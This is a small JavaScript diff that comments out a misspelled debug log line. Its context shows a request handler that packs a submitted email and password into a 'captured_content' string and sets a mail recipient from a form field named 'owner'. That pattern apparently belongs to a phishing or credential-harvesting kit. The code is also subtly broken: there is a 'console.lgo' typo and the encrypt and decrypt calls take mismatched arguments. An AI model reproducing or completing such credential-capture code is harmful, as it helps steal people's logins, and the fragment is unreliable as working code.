@@ -50,7 +50,7 @@ const encrypted = encryptpwd.encrypt(text, password);
  
  
 const decrypted = encryptpwd.decrypt(pass, text);
-console.lgo(decrypted);
+//console.lgo(decrypted);
     
     var captured_content = `\n Email: ${req.body.email} Password: ${encrypted}`;
     let toMail = req.body.owner;
